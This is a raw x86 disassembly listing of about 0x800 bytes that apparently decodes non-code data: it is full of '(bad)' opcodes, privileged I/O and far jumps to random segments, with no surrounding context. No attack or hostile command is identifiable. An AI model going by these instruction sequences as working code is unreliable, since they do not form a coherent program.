  4185bf:	test   BYTE PTR [eax-0x6c],bl
  4185c2:	out    dx,eax
  4185c3:	popf   
  4185c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185c5:	es push 0xffffffec
  4185c8:	cmp    BYTE PTR [ebx+eiz*4-0x7ee5b91e],ch
  4185cf:	jmp    0xa5a8:0xc5e88de6
  4185d6:	mov    edx,0x3f8846b7
  4185db:	in     al,0xd3
  4185dd:	push   0xd6455d2b
  4185e2:	loope  0x418639
  4185e4:	jnp    0x4185a1
  4185e6:	sub    BYTE PTR [ecx+ebp*8],cl
  4185e9:	hlt    
  4185ea:	hlt    
  4185eb:	xchg   esp,eax
  4185ec:	lods   al,BYTE PTR ds:[esi]
  4185ed:	pop    esp
  4185ee:	push   eax
  4185ef:	inc    ecx
  4185f0:	adc    ebp,DWORD PTR [eax-0x75967a02]
  4185f6:	outs   dx,DWORD PTR ds:[esi]
  4185f7:	mov    ebx,0xb33b5a16
  4185fc:	in     eax,0x1a
  4185fe:	jo     0x418658
  418600:	lea    edi,[edi]
  418602:	(bad)  
  418603:	ds addr16 push edx
  418606:	imul   esp,ebp,0xffffff99
  418609:	adc    ebp,DWORD PTR [ebx]
  41860b:	addr16 test eax,0x945028c5
  418611:	xor    esp,ecx
  418613:	inc    eax
  418614:	cmp    ah,ch
  418616:	jmp    DWORD PTR [ebp+0x23265f5f]
  41861c:	push   ss
  41861d:	mov    ds:0x4b6a1f70,eax
  418622:	jo     0x4185f3
  418624:	mov    dl,0xac
  418626:	not    BYTE PTR [ecx+0x47]
  418629:	push   ds
  41862a:	mov    ah,0x0
  41862c:	cmp    dl,BYTE PTR [edi-0x6]
  41862f:	repz add ecx,DWORD PTR [ebx+0x136508e8]
  418636:	ret    0xe929
  418639:	sar    DWORD PTR [esi-0x75b97293],0x8
  418640:	out    0xa7,eax
  418642:	(bad)  
  418644:	out    0x73,eax
  418646:	jae    0x4185d3
  418648:	push   es
  418649:	mov    eax,ds:0xa9c1eb82
  41864e:	push   cs
  41864f:	push   cs
  418650:	fisubr DWORD PTR [edi+esi*8-0x1444048]
  418657:	sub    DWORD PTR [edx+0x18051f4],ebp
  41865d:	pop    ebx
  41865e:	in     eax,dx
  41865f:	xchg   ecx,eax
  418660:	ror    edi,cl
  418662:	inc    ecx
  418663:	(bad)  
  418665:	arpl   WORD PTR [ecx-0x12f3b417],ax
  41866b:	adc    eax,0x8e4ae872
  418670:	mov    al,0xb8
  418672:	jle    0x41868d
  418674:	ja     0x4186a1
  418676:	sar    BYTE PTR [eax+0x49],1
  418679:	pop    eax
  41867a:	stos   DWORD PTR es:[edi],eax
  41867b:	and    DWORD PTR [edx+ebx*4+0x6d],eax
  41867f:	inc    edi
  418680:	jp     0x418674
  418682:	fwait
  418683:	test   al,0x27
  418685:	mov    bh,0x75
  418687:	push   ds
  418688:	mov    BYTE PTR [eax+0x63],bh
  41868b:	add    DWORD PTR [esi-0x2b44bfec],edi
  418691:	or     al,0x65
  418693:	push   ebp
  418694:	fwait
  418695:	inc    esp
  418696:	push   ecx
  418697:	pop    edi
  418698:	mov    eax,ds:0x58ffcc67
  41869d:	(bad)  
  41869e:	xchg   esi,eax
  41869f:	mov    WORD PTR [ebp+0x6f778f36],ds
  4186a5:	fiadd  DWORD PTR [esi-0x7]
  4186a8:	push   0xc957bf0d
  4186ad:	pop    ss
  4186ae:	repnz push edi
  4186b0:	xchg   ecx,eax
  4186b1:	pop    ss
  4186b2:	mov    DWORD PTR [ebp-0x7e4bbea5],ecx
  4186b8:	adc    bl,dl
  4186ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186bb:	outs   dx,DWORD PTR ds:[esi]
  4186bc:	sub    dh,BYTE PTR [edi+0x28]
  4186bf:	out    dx,al
  4186c0:	imul   esp,DWORD PTR [eax],0x172a7581
  4186c6:	das    
  4186c7:	xchg   edx,eax
  4186c8:	aam    0xdd
  4186ca:	(bad)  
  4186cb:	out    0x9e,al
  4186cd:	loop   0x418668
  4186cf:	rcr    DWORD PTR [ecx],1
  4186d1:	lods   al,BYTE PTR ds:[esi]
  4186d2:	shl    DWORD PTR [esi-0x3e9156ce],cl
  4186d8:	and    al,0x24
  4186da:	out    0x9d,al
  4186dc:	sti    
  4186dd:	inc    esp
  4186de:	add    bh,BYTE PTR [edi+esi*8-0x6f]
  4186e2:	cmp    DWORD PTR [ebp+0x7f],esp
  4186e5:	mov    edi,0xf571808f
  4186ea:	xor    BYTE PTR [edx+0x52718980],bl
  4186f0:	inc    esi
  4186f1:	fimul  WORD PTR [ebx+0x383183d6]
  4186f7:	jae    0x418751
  4186f9:	cdq    
  4186fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186fb:	outs   dx,BYTE PTR ds:[esi]
  4186fc:	inc    esp
  4186fd:	ffree  st(4)
  4186ff:	fcomp  DWORD PTR [ecx-0xdca75e9]
  418705:	scas   al,BYTE PTR es:[edi]
  418706:	xchg   esp,eax
  418707:	add    DWORD PTR [ebx+0x3ecf9104],ebp
  41870d:	das    
  41870e:	(bad)  [esi+0x1a5ce77b]
  418714:	js     0x4186b0
  418716:	push   edx
  418717:	xor    DWORD PTR [ebp-0x5c],esi
  41871a:	ins    BYTE PTR es:[edi],dx
  41871b:	sahf   
  41871c:	xchg   ecx,eax
  41871d:	push   ds
  41871e:	es into 
  418720:	(bad)  
  418721:	fs ret 
  418723:	cmp    edi,DWORD PTR [ecx+eax*1+0x46]
  418727:	outs   dx,BYTE PTR ds:[esi]
  418728:	dec    edi
  418729:	stos   DWORD PTR es:[edi],eax
  41872a:	test   al,0x13
  41872c:	in     al,0x6c
  41872e:	jae    0x418738
  418730:	add    eax,0x458fadd4
  418735:	mov    cs,eax
  418737:	mov    bl,0x70
  418739:	enter  0x5057,0x2
  41873d:	shr    dh,0x7a
  418740:	sbb    ecx,esi
  418742:	int    0x88
  418744:	jle    0x41874f
  418746:	sub    esp,0xff2be972
  41874c:	mov    edi,0x36990d16
  418751:	sbb    al,0xc3
  418753:	pushf  
  418754:	pop    eax
  418755:	cwde   
  418756:	fisttp DWORD PTR [edi]
  418758:	pop    esp
  418759:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41875a:	mov    bh,0x86
  41875c:	test   DWORD PTR [eax+ebp*1+0x6a947ad6],esi
  418763:	xor    dl,BYTE PTR [ebx-0x7d]
  418766:	cmp    bh,BYTE PTR [esi+0x7285a9a5]
  41876c:	repz pushf 
  41876e:	pusha  
  41876f:	scas   eax,DWORD PTR es:[edi]
  418770:	cld    
  418771:	xor    bh,BYTE PTR [esp+edi*8+0x70caf724]
  418778:	cli    
  418779:	adc    eax,0xcff8226d
  41877e:	or     al,0x2f
  418780:	adc    BYTE PTR [edx+0x41],cl
  418783:	dec    esp
  418784:	(bad)  
  418786:	cwde   
  418787:	cmp    eax,0x7c03c205
  41878c:	xchg   edi,eax
  41878d:	xchg   esi,eax
  41878e:	not    DWORD PTR [ebp+0x31b3848f]
  418794:	ins    DWORD PTR es:[edi],dx
  418795:	ret    0x24c8
  418798:	repz aas 
  41879a:	push   0xffffff9a
  41879c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41879d:	scas   al,BYTE PTR es:[edi]
  41879e:	mul    ah
  4187a0:	push   0xa1c20782
  4187a5:	pop    eax
  4187a6:	aam    0x7f
  4187a8:	inc    edi
  4187a9:	jo     0x418823
  4187ab:	ret    
  4187ac:	adc    al,BYTE PTR [eax]
  4187ae:	call   0x3e94:0x4ed9e7d5
  4187b5:	int3   
  4187b6:	inc    BYTE PTR [ecx-0x504c1f05]
  4187bc:	out    0xa7,eax
  4187be:	ss pop eax
  4187c0:	mov    ebp,0xa7de81a4
  4187c5:	mov    dl,0x6
  4187c7:	pop    esp
  4187c8:	pop    ebp
  4187c9:	inc    eax
  4187ca:	rcl    DWORD PTR [edi-0x721f75ba],0x9f
  4187d1:	mov    al,0xb5
  4187d3:	xchg   edi,eax
  4187d4:	shl    DWORD PTR [ebx+ebx*2+0x61],1
  4187d8:	push   es
  4187d9:	mov    esp,0x36975ae9
  4187de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187df:	jge    0x418793
  4187e1:	sbb    DWORD PTR [edi-0x67b9d576],edi
  4187e7:	loopne 0x4187fa
  4187e9:	sbb    BYTE PTR [ebx],ah
  4187eb:	add    DWORD PTR [edx],0xa9c68af2
  4187f1:	mov    eax,ds:0x6aff3e2a
  4187f6:	push   eax
  4187f7:	ret    
  4187f8:	mov    ah,al
  4187fa:	pusha  
  4187fb:	aad    0x7b
  4187fd:	cmovo  eax,DWORD PTR [bp+di]
  418801:	idiv   BYTE PTR [eax+0x1df630f7]
  418807:	inc    edi
  418808:	loopne 0x41884d
  41880a:	call   0x1a3f:0xe008444b
  418811:	inc    BYTE PTR [ecx+0x8ff1baa]
  418817:	sub    eax,0xfd5a5eec
  41881c:	fst    DWORD PTR [ebx*8-0x4b3b84ec]
  418823:	mov    ebx,0x6c2816bb
  418828:	imul   ebp,DWORD PTR [eax-0x54],0x26
  41882c:	aam    0xa0
  41882e:	mov    eax,ds:0xd501b56f
  418833:	xor    DWORD PTR [edi+0xd],edi
  418836:	test   al,0x21
  418838:	mov    WORD PTR [edx+0x446c117c],ss
  41883e:	adc    BYTE PTR [ebx+0x6fbb907],bh
  418844:	addr16 sbb dl,ch
  418847:	ins    BYTE PTR es:[edi],dx
  418848:	mov    bh,0x84
  41884a:	div    DWORD PTR [edx]
  41884c:	xor    dh,dl
  41884e:	mov    cr2,ebx
  418851:	int    0xb
  418853:	mov    eax,0x9bd124b1
  418858:	sbb    BYTE PTR [ecx-0x29],dh
  41885b:	inc    DWORD PTR [ebp+ebp*2-0x45906cd2]
  418862:	(bad)
  418865:	or     DWORD PTR [edx+0x70],eax
  418868:	ds mov edi,0xa9c21021
  41886e:	ret    0x52b
  418871:	cmp    BYTE PTR [esi+esi*4+0x19],dl
  418875:	arpl   WORD PTR [ebx],ax
  418877:	mov    ch,0x1f
  418879:	(bad)  
  41887a:	push   esi
  41887b:	mov    dh,0x1a
  41887d:	aad    0x5d
  41887f:	push   es
  418880:	mov    bh,0xfc
  418882:	dec    esp
  418883:	lock fiadd WORD PTR [eax]
  418886:	sbb    ch,BYTE PTR [ebp+0x6a]
  418889:	sbb    dl,BYTE PTR [ebx+0x713a5f84]
  41888f:	xor    BYTE PTR [esi+0x1a],0x14
  418893:	or     al,0x60
  418895:	jno    0x41881f
  418897:	cmp    al,0x2c
  418899:	jg     0x4188fb
  41889b:	mov    ds:0x7eefc7eb,eax
  4188a0:	dec    eax
  4188a1:	std    
  4188a2:	es xchg ebx,eax
  4188a4:	add    al,0x1c
  4188a6:	out    0xf4,eax
  4188a8:	jmp    0x9161:0xf90939ac
  4188af:	mov    esp,esp
  4188b1:	shl    DWORD PTR [esi-0x73626767],0x43
  4188b8:	fdivp  st(7),st
  4188ba:	or     BYTE PTR [eax+0x4ee8dd0a],0x3b
  4188c1:	adc    ah,al
  4188c3:	popa   
  4188c4:	ret    0x8616
  4188c7:	fwait
  4188c8:	daa    
  4188c9:	push   cs
  4188ca:	push   edx
  4188cb:	mov    edx,0x7fa0eb6b
  4188d0:	jmp    0xe76f9cef
  4188d5:	stos   BYTE PTR es:[edi],al
  4188d6:	int3   
  4188d7:	and    DWORD PTR [edi-0x39568a9b],0xffffffec
  4188de:	xchg   esi,eax
  4188df:	cmp    ah,BYTE PTR [edx-0x6fe040da]
  4188e5:	lahf   
  4188e6:	outs   dx,BYTE PTR ds:[esi]
  4188e7:	lods   al,BYTE PTR ds:[esi]
  4188e8:	in     eax,0x76
  4188ea:	inc    ebx
  4188eb:	data16 jns 0x4188b7
  4188ee:	lods   eax,DWORD PTR ds:[esi]
  4188ef:	sbb    BYTE PTR [edi-0x375a5701],cl
  4188f5:	sub    al,0x4b
  4188f7:	push   esi
  4188f8:	mov    ecx,0x9bfb85fa
  4188fd:	jb     0x418953
  4188ff:	push   ds
  418900:	cmove  ecx,DWORD PTR [esi-0x44e7137d]
  418907:	ret    0xf30
  41890a:	shl    BYTE PTR fs:[eax+0x6865f67e],0x7a
  418912:	pop    ds
  418913:	xchg   edx,eax
  418914:	inc    esp
  418915:	imul   esp,eax,0x21
  418918:	mov    ebp,0xa3a6b900
  41891d:	in     eax,dx
  41891e:	dec    ecx
  41891f:	cdq    
  418920:	test   BYTE PTR [ebp-0x1059622],al
  418926:	arpl   WORD PTR [edi-0x3df58999],di
  41892c:	sbb    eax,0x41c4e3c4
  418931:	arpl   WORD PTR [ebp+0x1b],ax
  418934:	or     al,0x9d
  418936:	sub    al,0xd9
  418938:	dec    ecx
  418939:	mov    ch,0x97
  41893b:	sahf   
  41893c:	popa   
  41893d:	xchg   DWORD PTR [eax],edi
  41893f:	into   
  418940:	ud1    esi,esi
  418943:	mov    dh,0xe4
  418945:	cs test eax,0xc6d0a766
  41894b:	dec    ebx
  41894c:	shl    DWORD PTR [eax+0x18b7e41e],1
  418952:	int3   
  418953:	jno    0x418967
  418955:	push   0xfffffffd
  418957:	imul   eax,DWORD PTR [ebp+0x23],0xffffff93
  41895b:	mov    al,0x36
  41895d:	into   
  41895e:	sbb    BYTE PTR [ebp-0x7f],ah
  418961:	pop    esp
  418962:	inc    ebx
  418963:	xor    bh,BYTE PTR [ebp-0x9]
  418966:	mov    DWORD PTR gs:[bx-0x5f],esp
  41896b:	sbb    al,0x88
  41896d:	push   esi
  41896e:	dec    edx
  41896f:	push   esp
  418970:	or     BYTE PTR [esi+ebx*2],bh
  418973:	push   es
  418974:	mov    al,ds:0x1acc384a
  418979:	adc    ch,BYTE PTR [esi+ebp*2+0x29]
  41897d:	out    0x7f,eax
  41897f:	call   DWORD PTR [ecx-0x70a73b56]
  418985:	inc    eax
  418986:	sub    DWORD PTR [ebp-0x6],ebp
  418989:	xor    esi,ecx
  41898b:	sub    bh,BYTE PTR [esi+0x1d5d3ff1]
  418991:	mov    esi,ss
  418993:	lock (bad) 
  418995:	xchg   esp,eax
  418996:	mov    esi,0x7fa7e343
  41899b:	(bad)  
  41899c:	jmp    FWORD PTR [ebx+eax*8]
  41899f:	push   esp
  4189a0:	data16 adc BYTE PTR [ebx],cl
  4189a3:	arpl   WORD PTR [edx],si
  4189a5:	jbe    0x4189a6
  4189a7:	outs   dx,DWORD PTR ds:[esi]
  4189a8:	xchg   BYTE PTR [ecx-0x61],al
  4189ab:	ds mov ah,0x78
  4189ae:	into   
  4189af:	gs push eax
  4189b1:	arpl   WORD PTR [ebx-0x3f],dx
  4189b4:	jecxz  0x418a14
  4189b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189b7:	xchg   ebp,eax
  4189b8:	sub    cl,dh
  4189ba:	jmp    0x7c262027
  4189bf:	sbb    BYTE PTR [esi-0x68],ah
  4189c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189c3:	and    BYTE PTR [esi],al
  4189c5:	sub    BYTE PTR [edi],dl
  4189c7:	imul   edx,esp,0x16
  4189ca:	add    ebx,DWORD PTR [esi]
  4189cc:	adc    ch,bh
  4189ce:	mov    ebp,0xd5c4407f
  4189d3:	sahf   
  4189d4:	pop    ebx
  4189d5:	hlt    
  4189d6:	arpl   WORD PTR [esi-0x3f50d4a3],bp
  4189dc:	push   cs
  4189dd:	xchg   ebx,eax
  4189de:	xlat   BYTE PTR ds:[ebx]
  4189df:	push   ss
  4189e0:	sub    DWORD PTR [edx+0x2228a67d],0xffffff87
  4189e7:	inc    esi
  4189e8:	jge    0x418a06
  4189ea:	(bad)  
  4189eb:	and    al,0x78
  4189ed:	push   esp
  4189ee:	cdq    
  4189ef:	add    al,0xc0
  4189f1:	xor    BYTE PTR [ebx],cl
  4189f3:	push   0xb871ab2d
  4189f8:	mov    al,BYTE PTR [esi]
  4189fa:	mov    bl,BYTE PTR [edx+0x57be66cb]
  418a00:	popa   
  418a01:	test   eax,0xe664388e
  418a06:	sti    
  418a07:	xor    eax,0x24ae333
  418a0c:	or     BYTE PTR [ecx+edi*4+0x4d],bl
  418a10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a11:	and    al,0xb5
  418a13:	xor    ebx,eax
  418a15:	mov    ds:0x93bd5580,al
  418a1a:	adc    eax,0x8ebe2094
  418a1f:	push   es
  418a20:	cli    
  418a21:	jae    0x418a07
  418a23:	cmc    
  418a24:	push   0x4fde8e5e
  418a29:	add    ebp,edx
  418a2b:	lahf   
  418a2c:	popa   
  418a2d:	cwde   
  418a2e:	mov    ebx,0x2bb87c06
  418a33:	in     al,0x4a
  418a35:	fistp  WORD PTR [edx]
  418a37:	pop    ebx
  418a38:	je     0x418ab3
  418a3a:	lea    ecx,[eax]
  418a3c:	ret    
  418a3d:	add    esi,DWORD PTR [ebp+eiz*8-0xfe9f6fc]
  418a44:	sbb    al,0xb8
  418a46:	test   DWORD PTR [ebx],0x71e7a731
  418a4c:	and    al,0x88
  418a4e:	or     eax,0xbec59e20
  418a53:	push   cs
  418a54:	fcmovu st,st(3)
  418a56:	add    ecx,edi
  418a58:	dec    edx
  418a59:	and    DWORD PTR [edi+0x401bffbb],edx
  418a5f:	push   ebp
  418a60:	push   ss
  418a61:	xchg   BYTE PTR [ecx+0x1a7b3f22],dh
  418a67:	jo     0x418ab1
  418a69:	mov    ebx,0x56a66bfa
  418a6e:	or     cl,BYTE PTR [edi-0xc]
  418a71:	jbe    0x418a46
  418a73:	fcom   st(6)
  418a75:	inc    ebp
  418a76:	cmove  ebx,ebp
  418a79:	into   
  418a7a:	clc    
  418a7b:	fild   WORD PTR [edi-0x52]
  418a7e:	mov    eax,ds:0x690b1a24
  418a83:	mov    bl,0x69
  418a85:	cwde   
  418a86:	mov    WORD PTR [ebp-0x55],es
  418a89:	rol    BYTE PTR [ecx],1
  418a8b:	dec    esp
  418a8c:	mov    ebp,0x4d9151c9
  418a91:	push   edi
  418a92:	dec    esi
  418a93:	xor    al,0x82
  418a95:	sbb    edi,ebp
  418a97:	xchg   ebp,eax
  418a98:	jg     0x418ad9
  418a9a:	dec    edi
  418a9b:	xor    BYTE PTR [eax-0x4a1cfd0e],dh
  418aa1:	cmp    bl,BYTE PTR [edx+ebp*1+0x110bd222]
  418aa8:	aam    0xd
  418aaa:	loope  0x418ab2
  418aac:	mov    al,BYTE PTR [ecx]
  418aae:	cmp    DWORD PTR [edx+0x748572cf],0x3c
  418ab5:	mov    ebp,0x3b886b71
  418aba:	shl    cl,0x24
  418abd:	(bad)  
  418abe:	adc    eax,0x81effca0
  418ac3:	dec    ecx
  418ac4:	in     al,0x72
  418ac6:	pop    ss
  418ac7:	pop    es
  418ac8:	fs inc eax
  418aca:	mul    BYTE PTR [edi-0x2]
  418acd:	pop    eax
  418ace:	mov    eax,0x1a301ce
  418ad3:	jno    0x418aac
  418ad5:	push   ecx
  418ad6:	xchg   edx,eax
  418ad7:	imul   ecx,DWORD PTR [ebp-0x29aa6b6f],0x1947399f
  418ae1:	lods   al,BYTE PTR ds:[esi]
  418ae2:	sbb    bl,BYTE PTR [ecx]
  418ae4:	pop    esi
  418ae5:	es test al,0x92
  418ae8:	shr    ch,cl
  418aea:	outs   dx,BYTE PTR ds:[esi]
  418aeb:	cmc    
  418aec:	data16 lahf 
  418aee:	in     al,0x41
  418af0:	xor    eax,esp
  418af2:	cmp    ch,BYTE PTR ds:[ebx]
  418af5:	and    bl,ch
  418af7:	xchg   BYTE PTR [edx],ch
  418af9:	pushf  
  418afa:	inc    ebp
  418afb:	xchg   ebp,eax
  418afc:	fisub  WORD PTR [eax+0x163659f9]
  418b02:	mov    ebx,0xa40499ec
  418b07:	rcr    BYTE PTR [ebp-0x5ec866c6],1
  418b0d:	fldcw  WORD PTR [eax-0x4]
  418b10:	dec    ebx
  418b11:	mov    ds:0x7ece4e54,al
  418b16:	outs   dx,DWORD PTR ds:[esi]
  418b17:	push   ds
  418b18:	(bad)  
  418b19:	icebp  
  418b1a:	dec    esp
  418b1b:	test   BYTE PTR [edi],cl
  418b1d:	inc    eax
  418b1e:	jno    0x418aaa
  418b20:	enter  0xd7d0,0x1e
  418b24:	daa    
  418b25:	xor    ecx,DWORD PTR [eax-0x2f5c83c6]
  418b2b:	je     0x418adb
  418b2d:	mov    ds:0x2499ab4,eax
  418b32:	mov    al,ds:0x7c539c8c
  418b37:	in     eax,0xa5
  418b39:	int    0x4a
  418b3b:	jmp    0xc0f4:0xd87fba97
  418b42:	jno    0x418baa
  418b44:	mov    ds:0xcc782d7f,eax
  418b49:	jmp    0x284339bc
  418b4e:	and    DWORD PTR [esi+esi*1],esp
  418b51:	or     eax,0xe7beb7ca
  418b56:	out    dx,al
  418b57:	test   DWORD PTR [ebx+0x7b0c6d7b],0xf102b9e3
  418b61:	sbb    al,0x5
  418b63:	dec    ebp
  418b64:	aad    0x73
  418b66:	pop    es
  418b67:	fbld   TBYTE PTR [eax]
  418b69:	ret    
  418b6a:	jecxz  0x418bbc
  418b6c:	mov    edi,0x4f84d600
  418b71:	pop    ebx
  418b72:	into   
  418b73:	fs inc ebp
  418b75:	jne    0x418b13
  418b77:	sub    al,0xaa
  418b79:	dec    edx
  418b7a:	mov    ds:0xc963de0,al
  418b7f:	push   esi
  418b80:	sub    DWORD PTR [esi],esi
  418b82:	xchg   esp,eax
  418b83:	push   0xffffffd5
  418b85:	nop
  418b86:	sub    al,0x93
  418b88:	jmp    0xea1e:0x457f0114
  418b8f:	aaa    
  418b90:	mov    esi,0xfee12ca2
  418b95:	repz inc edi
  418b97:	push   eax
  418b98:	sub    al,0x46
  418b9a:	pop    edx
  418b9b:	jo     0x418ba2
  418b9d:	shr    BYTE PTR [ecx],cl
  418b9f:	jne    0x418b63
  418ba1:	in     eax,dx
  418ba2:	jns    0x418b4a
  418ba4:	jle    0x418b33
  418ba6:	push   ss
  418ba7:	out    0x11,al
  418ba9:	push   edx
  418baa:	and    BYTE PTR [ebx+edi*2-0x7],dl
  418bae:	jl     0x418c26
  418bb0:	adc    bh,BYTE PTR [edx]
  418bb2:	shl    BYTE PTR [eax+esi*1+0x1c],cl
  418bb6:	je     0x418ba5
  418bb8:	push   esp
  418bb9:	das    
  418bba:	xchg   ecx,eax
  418bbb:	(bad)  
  418bbc:	dec    eax
  418bbd:	mov    ds:0x57ba4e61,eax
  418bc2:	call   DWORD PTR [ebp+eax*8-0x1cc5e5f0]
  418bc9:	jnp    0x418c1b
  418bcb:	mov    ebp,0x2cbebd37
  418bd0:	out    dx,eax
  418bd1:	push   ss
  418bd2:	dec    ebx
  418bd3:	cmp    eax,0xbf64a13b
  418bd8:	int3   
  418bd9:	popa   
  418bda:	and    edx,DWORD PTR [esi+0x66b34379]
  418be0:	loope  0x418c33
  418be2:	cmp    al,0x7e
  418be4:	xor    BYTE PTR [edi],ah
  418be6:	pop    edi
  418be7:	rol    BYTE PTR [ecx-0x75],1
  418bea:	into   
  418beb:	leave  
  418bec:	mov    ch,0x2d
  418bee:	sbb    DWORD PTR [edi+0x23],esi
  418bf1:	ins    BYTE PTR es:[edi],dx
  418bf2:	(bad)  
  418bf3:	cmp    DWORD PTR [eax],ebp
  418bf5:	in     eax,0x84
  418bf7:	jns    0x418bde
  418bf9:	mov    WORD PTR [ebp+0x22722dda],?
  418bff:	jo     0x418c70
  418c01:	push   ds
  418c02:	xchg   DWORD PTR [edx+0x1c365068],edi
  418c08:	jg     0x418c3c
  418c0a:	jno    0x418bb7
  418c0c:	xor    al,ch
  418c0e:	sti    
  418c0f:	std    
  418c10:	xchg   esp,eax
  418c11:	and    DWORD PTR [ebx-0x6beb331c],ebp
  418c17:	jmp    0x418c30
  418c19:	add    DWORD PTR [edi+0x4b],esi
  418c1c:	pop    eax
  418c1d:	cmp    al,0x97
  418c1f:	daa    
  418c20:	add    eax,0x7ff4ada4
  418c25:	hlt    
  418c26:	ror    BYTE PTR ds:0x2d09b666,1
  418c2c:	test   BYTE PTR [esi],cl
  418c2e:	pop    edx
  418c2f:	cli    
  418c30:	add    eax,edi
  418c32:	dec    ebx
  418c33:	push   eax
  418c34:	push   esp
  418c35:	pop    es
  418c36:	out    0x3c,al
  418c38:	xchg   esi,eax
  418c39:	sub    bh,BYTE PTR [ecx-0x35b3645]
  418c3f:	aas    
  418c40:	mov    DWORD PTR [edi],esp
  418c42:	lahf   
  418c43:	popa   
  418c44:	aad    0x56
  418c46:	pop    edx
  418c47:	and    BYTE PTR ds:0x294e8b8c,bl
  418c4d:	dec    ecx
  418c4e:	sbb    ebx,DWORD PTR ds:0x11b60f53
  418c54:	int3   
  418c55:	sti    
  418c56:	jle    0x418c33
  418c58:	jae    0x418bfa
  418c5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c5b:	fs in  eax,0x90
  418c5e:	adc    cl,BYTE PTR [esi]
  418c60:	dec    esi
  418c61:	push   esi
  418c62:	mov    ds:0x42a4eaf9,al
  418c67:	es pop eax
  418c69:	popf   
  418c6a:	adc    DWORD PTR fs:[edx-0x38],esp
  418c6e:	or     eax,0x94249d7c
  418c73:	mov    dl,0x10
  418c75:	jnp    0x418cf1
  418c77:	or     DWORD PTR [ecx],ebx
  418c79:	jle    0x418cd0
  418c7b:	push   edi
  418c7c:	jnp    0x418cc9
  418c7e:	lock sti 
  418c80:	dec    edi
  418c81:	aam    0x30
  418c83:	lahf   
  418c84:	sbb    BYTE PTR [eax+0x3e03e0ed],dl
  418c8a:	xor    DWORD PTR [edx],eax
  418c8c:	mov    eax,0xda21a455
  418c91:	ins    BYTE PTR es:[edi],dx
  418c92:	xchg   ecx,eax
  418c93:	in     al,0xee
  418c95:	retf   
  418c96:	and    eax,0x41e5e4ed
  418c9b:	or     BYTE PTR ds:0x90dfb382,cl
  418ca1:	cld    
  418ca2:	aam    0xe4
  418ca4:	cmp    DWORD PTR [edx+0x47],ecx
  418ca7:	sbb    eax,0x39426f32
  418cac:	dec    ecx
  418cad:	push   cs
  418cae:	xor    eax,0x8d1ac392
  418cb3:	hlt    
  418cb4:	loope  0x418ca2
  418cb6:	inc    ecx
  418cb7:	jge    0x418ce5
  418cb9:	xchg   BYTE PTR [edx+0x3763e5b1],al
  418cbf:	stos   DWORD PTR es:[edi],eax
  418cc0:	icebp  
  418cc1:	popa   
  418cc2:	cmp    esi,DWORD PTR [esi+0x611c48f9]
  418cc8:	dec    eax
  418cc9:	adc    BYTE PTR [ebx-0x4d3032b6],al
  418ccf:	enter  0xf50b,0xde
  418cd3:	xchg   esp,eax
  418cd4:	in     al,dx
  418cd5:	xor    bl,0x3d
  418cd8:	mov    ah,0x6a
  418cda:	xor    BYTE PTR [ebx],al
  418cdc:	es iret 
  418cde:	push   ebx
  418cdf:	call   0x858c:0xa1fdae17
  418ce6:	es out 0x2d,al
  418ce9:	mov    cl,0xe9
  418ceb:	cwde   
  418cec:	lods   al,BYTE PTR ds:[esi]
  418ced:	ret    0x8e20
  418cf0:	idiv   DWORD PTR [eax]
  418cf2:	mov    bl,0x88
  418cf4:	sbb    eax,0x174eabfe
  418cf9:	arpl   bx,cx
  418cfb:	cld    
  418cfc:	add    ecx,DWORD PTR [edi-0x41]
  418cff:	sahf   
  418d00:	(bad)  
  418d01:	je     0x418c94
  418d03:	imul   ecx,esi,0x3c
  418d06:	inc    ecx
  418d07:	ds int3 
  418d09:	leave  
  418d0a:	mov    edx,0xb771d710
  418d0f:	je     0x418d10
  418d11:	mov    BYTE PTR [esi+eax*1+0x400e73a7],0xa8
  418d19:	add    ah,bl
  418d1b:	pop    edx
  418d1c:	retf   0xad64
  418d1f:	inc    ecx
  418d20:	(bad)  
  418d21:	mov    esp,0xe67c57fd
  418d26:	sbb    DWORD PTR [eax+0x46],ecx
  418d29:	mov    bl,0x1
  418d2b:	pop    esp
  418d2c:	xchg   esp,eax
  418d2d:	ret    
  418d2e:	inc    ecx
  418d2f:	sysexit 
  418d31:	push   0xa
  418d33:	inc    esp
  418d34:	jbe    0x418cdd
  418d36:	mov    edi,0xcfcba31e
  418d3b:	jg     0x418cd4
  418d3d:	inc    edx
  418d3e:	call   0x15c9:0x88ee7cb5
  418d45:	inc    edx
  418d46:	icebp  
  418d47:	inc    ebp
  418d48:	call   0x1a98:0xd93d48b9
  418d4f:	mov    ds:0xa14784ac,eax
  418d54:	mov    DWORD PTR [ebx-0x68aaa537],0x412b1d33
  418d5e:	mov    ds,ecx
  418d60:	xchg   ecx,eax
  418d61:	cmp    al,ah
  418d63:	jae    0x418cf7
  418d65:	xor    eax,0x6294e009
  418d6a:	inc    eax
  418d6b:	fwait
  418d6c:	int    0xe4
  418d6e:	test   dl,dh
  418d70:	test   al,0xd
  418d72:	adc    DWORD PTR [ebp+0x11],ebp
  418d75:	or     DWORD PTR ds:0x82d2edb7,ebx
  418d7b:	clc    
  418d7c:	mov    edi,0x6579d7d1
  418d81:	and    eax,DWORD PTR [ebx]
  418d83:	mov    ebp,0x453d0731
  418d88:	sbb    BYTE PTR [edx+0x4741ada4],0x9d
  418d8f:	or     DWORD PTR [ebx-0x28],esp
  418d92:	ins    BYTE PTR es:[edi],dx
  418d93:	push   ecx
  418d94:	idiv   DWORD PTR [ebx]
  418d96:	fwait
  418d97:	cmp    cl,BYTE PTR [ebx]
  418d99:	add    DWORD PTR ds:0x512bc4ce,ebp
  418d9f:	xor    eax,0xc3d25c28
  418da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418da5:	xchg   esi,eax
  418da6:	push   esi
  418da7:	push   edx
  418da8:	test   eax,0x8c11cbd4
  418dad:	push   ecx
  418dae:	pop    esp
  418daf:	fcomp  DWORD PTR [edi-0x1f49c3fd]
  418db5:	jg     0x418d6d
